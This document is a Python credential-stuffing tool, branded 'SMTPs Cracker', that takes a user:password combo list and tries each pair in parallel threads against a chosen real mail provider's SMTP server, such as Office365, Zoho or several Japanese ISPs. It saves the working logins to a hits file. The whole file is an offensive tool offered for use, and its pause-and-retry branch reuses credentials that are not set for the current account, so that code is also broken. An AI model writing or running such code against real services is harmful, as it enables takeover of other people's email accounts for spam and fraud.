#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import time
import smtplib
import click
from multiprocessing.pool import ThreadPool

VALIDS = 0
INVALIDS = 0
TRIES = 0

os.system('cls')
os.system("title " + "SMTPs Cracker [ @exploitsdotcs ]")

click.echo(' SMTPS Multi Cracker [ ALL IN ONE @exploitsdotcs ] ')
time.sleep(0.1)
click.echo('''
===============  Settings ==================
      host list
International SMTP server
1. office365: smtp.office365.com
2. hostinger: smtp.hostinger.com
3. zoho: smtp.zoho.com
4. brevo: smtp-relay.sendinblue.com
5. mailgun: smtp.mailgun.org
6. aruba: smtp.aruba.it
7. smtp2go: mail.smtp2go.com
8. postmarkapp: smtp.postmarkapp.com

Japanese SMTP server
9. nifty: smtp.nifty.com
10. ocn: smtp.ocn.ne.jp
11. au: smtp.au.com
12. softbank: smtp.softbank.ne.jp
13. ntt: smtp.ntt.com
14. biglobe: smtp.biglobe.ne.jp
15. dion: smtp.dion.ne.jp
16. kgt: smtp.kgt.ne.jp ''')

click.echo('\n')

host_choice = input('                    Chose Number Host: ')
HOSTS = {
    '1': 'smtp.office365.com',
    '2': 'smtp.hostinger.com',
    '3': 'smtp.zoho.com',
    '4': 'smtp-relay.sendinblue.com',
    '5': 'smtp.mailgun.org',
    '6': 'smtp.aruba.it',
    '7': 'mail.smtp2go.com',
    '8': 'smtp.postmarkapp.com',
    '9': 'smtp.nifty.com',
    '10': 'smtp.ocn.ne.jp',
    '11': 'smtp.au.com',
    '12': 'smtp.softbank.ne.jp',
    '13': 'smtp.ntt.com',
    '14': 'smtp.biglobe.ne.jp',
    '15': 'smtp.dion.ne.jp',
    '16': 'smtp.kgt.ne.jp',
}

PORT = 587
THREADS = input('                    --> Number Threads (30-50) : ')
COMBO = input('                    --> Load List : ')

print('\n')

def log(account):
    global HOST, VALIDS, INVALIDS, TRIES
    HOST = HOSTS[host_choice]  # Ensure HOST is defined
    if account.count(":") == 1:
        if TRIES != 1000:
            TRIES += 1
            usr, pas = account.split(':')
            try:
                server = smtplib.SMTP(HOST, PORT)
                server.ehlo()
                server.starttls()
                server.login(usr, pas)
                VALIDS += 1
                os.system(f"title [+ ] J-SMTPS.PY - {HOST} -SUCCESS : {VALIDS} , FAILED : {INVALIDS} .")
                click.echo(click.style(f"                    [ $ ] SUCCESS    : {account}", fg='green'))
                with open('Result/SMTPS-HITS.txt', 'a+') as HITS:
                    HITS.write(f'{HOST}|{PORT}|{account}\n')
            except:
                INVALIDS += 1
                os.system(f"title [+ ] J-SMTPS.PY - {HOST} -SUCCESS : {VALIDS} , FAILED : {INVALIDS} .")
                click.echo(click.style(f"                    [ + ] FAILED : {account}", fg='red'))
        else:
            time.sleep(5)
            try:
                server = smtplib.SMTP(HOST, PORT)
                server.ehlo()
                server.starttls()
                server.login(usr, pas)
                VALIDS += 1
                os.system(f"title [+ ] J-SMTPS.PY - {HOST} -SUCCESS : {VALIDS} , FAILED : {INVALIDS} .")
                click.echo(click.style(f"                    [ $ ] SUCCESS    : {account}", fg='green'))
                with open('Result/SMTPS-HITS.txt', 'a+') as HITS:
                    HITS.write(f'{HOST}|{PORT}|{account}\n')
            except:
                INVALIDS += 1
                os.system(f"title [+ ] J-SMTPS.PY - {HOST} -SUCCESS : {VALIDS} , FAILED : {INVALIDS} .")
                click.echo(click.style(f"                    [ + ] FAILED : {account}", fg='red'))
            TRIES = 0
    else:
        INVALIDS += 1
        os.system(f"title [+ ] J-SMTPS.PY - {HOST} -SUCCESS : {VALIDS} , FAILED : {INVALIDS} .")
        click.echo(click.style(f"                    [ + ] FAILED : {account}", fg='red'))

if __name__ == '__main__':
    combo = open(COMBO, 'r', encoding='utf-8').read().split('\n')
    pool = ThreadPool(int(THREADS))
    for _ in pool.imap_unordered(log, combo):
        pass
